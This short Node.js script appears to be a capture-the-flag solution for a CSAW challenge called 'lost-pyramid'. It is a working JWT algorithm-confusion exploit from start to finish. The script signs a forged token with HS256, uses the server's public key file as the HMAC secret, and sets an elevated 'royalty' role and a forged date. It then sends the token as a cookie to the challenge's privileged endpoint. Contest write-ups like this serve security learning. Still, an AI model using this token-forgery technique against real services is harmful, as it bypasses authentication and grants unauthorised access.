const jwt = require("jsonwebtoken")
var fs = require("fs")

var pub = fs.readFileSync("pubkey.pem");
token = jwt.sign({
    "ROLE": "royalty",
    "CURRENT_DATE": "03_07_1341_BC",
}, pub, { algorithm: 'HS256' });
console.log(token);

fetch("https://lost-pyramid.ctf.csaw.io/kings_lair",
    { "headers": { "Cookie": "pyramid=" + token } }
).then((res) => { return res.text() }).then((res) => { console.log(res) })  